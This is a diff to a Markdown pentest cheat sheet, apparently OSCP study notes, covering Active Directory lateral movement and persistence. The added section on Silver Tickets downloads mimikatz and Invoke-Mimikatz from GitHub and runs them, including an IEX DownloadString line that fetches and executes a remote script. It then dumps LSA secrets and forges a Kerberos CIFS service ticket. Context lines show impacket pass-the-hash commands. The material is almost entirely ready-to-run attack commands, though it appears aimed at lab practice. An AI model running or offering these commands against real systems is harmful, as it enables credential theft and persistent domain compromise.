@@ -1285,20 +1285,6 @@ impacket-smbexec tech.local/goku@172.31.11.96 -hashes 00000000000000000000000000
 ```
 impacket-atexec -hashes 00000000000000000000000000000000:4533aaba903fbbe1377deb1642743283 tech.local/goku@172.31.11.96 whoami
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 # PERSISTENCE - ACTIVE DIRECTORY
 ## GOLDEN TICKET MIMIKATZ
 ##### GOLDEN TICKET MIMIKATZ - LOAD REQUIREMENTS
@@ -1349,6 +1335,37 @@ dir \\server01\c$
 enter-pssession -computername server01
 whoami > c:\eu.txt
 ```
+## SILVER TICKET MIMIKATZ
+##### SILVER TICKET MIMIKATZ - LOAD REQUIREMENTS
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
+expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
+cd x64
+.\mimikatz.exe
+```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/x64/mimikatz.exe -Outfile mimikatz.exe
+.\mimikatz.exe
+```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
+Import-Module .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz
+```
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
+Invoke-Mimikatz
+```
+##### SILVER TICKET MIMIKATZ - PEGAR O HASH DO COMPUTADOR ALVO (COMO ADMIN):
+```
+privilege::debug
+lsadump::lsa /patch
+```
+##### SILVER TICKET MIMIKATZ - GERAR TICKET P SERVICO NO COMPUTADOR ALVO EM QQ MAQUINA (TERMINAL NORMAL):
+```
+kerberos::golden /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /target:server01.tech.local /service:CIFS /rc4:aaaaa /user:administrator /ptt
+```
+ 
 
 
 
